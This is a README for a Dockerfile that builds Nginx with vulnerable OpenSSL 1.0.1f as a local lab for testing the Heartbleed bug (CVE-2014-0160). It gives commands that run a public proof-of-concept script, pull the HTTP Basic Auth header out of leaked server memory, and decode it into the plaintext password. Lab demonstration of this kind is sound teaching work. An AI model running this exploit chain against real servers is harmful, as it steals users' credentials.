## Testing Heartbleed with Nginx Dockerfile

This repository contains **Dockerfile** of **Nginx** with the vulnerable **OpenSSL version (1.0.1f)** for testing **CVE-2014-0160 Heartbleed** Vulnerability.

### Base Docker Image

* debian:latest

### Installation

1. Install [Docker](https://www.docker.com/)
    - Example with Debian: `apt-get install -y docker`

2. Download from public [Docker Hub Registry](https://registry.hub.docker.com/) the debian base image: 
`docker pull debian:latest`

3. Build the image from Dockerfile: `docker build -t heartbleed_nginx_img .`

### Usage

##### Start the Heartbleed+Nginx container

`docker run -i -t -p 1500:443 heartbleed_nginx_img`

##### Testing Heartbleed Vulnerability (CVE-2014-0160) with HTTP Basic Authentication method

1. Download the [Heartbleed-poc Python script](ttps://github.com/sensepost/heartbleed-poc/blob/master/heartbleed-poc.py) (For Testing Purposes Only !). This is a modified version originally by Jared Stafford <jspenguin@jspenguin.org>.
    **Thanks to SensePost for this one.**
2. Open two new Tabs on your current terminal and run :

    - First Tab (Generating **x100 GET requests** using **HTTP Basic Auth** with curl command):
 
        `for loop in {0..100..1}; do curl -X GET -s -i -k -u admin:myP@ssword0MG https://127.0.0.1:1500| grep -E "200"; done`

        
        HTTP/1.1 200 OK
        HTTP/1.1 200 OK
        HTTP/1.1 200 OK
        HTTP/1.1 200 OK
        snipp...
    - Second Tab (Generating **x100 Heartbeats(-n 100) requests** and write the memory dump to **"dump.bin"** file, then grab the result from **"Authorization"** field from memory dump and finally decode **Base64** result string to plain text in clear **^^**):

        `python heartbleed-poc.py -f dump.bin -q -n 100 -p 1500 127.0.0.1 && grep -a "^Authorization:" dump.bin | head -n1 | awk -F " " '{print $3}' | tr -d '\n\r' | base64 --decode && echo`

       
        WARNING: server 127.0.0.1 returned more data than it should - server is vulnerable!
        ... received message: type = 22, ver = 0302, length = 66
        ... received message: type = 22, ver = 0302, length = 925
        ... received message: type = 22, ver = 0302, length = 331
        ... received message: type = 22, ver = 0302, length = 4
        ... received message: type = 24, ver = 0302, length = 16384
        WARNING: server 127.0.0.1 returned more data than it should - server is vulnerable!
        snipp...
        admin:myP@ssword0MG

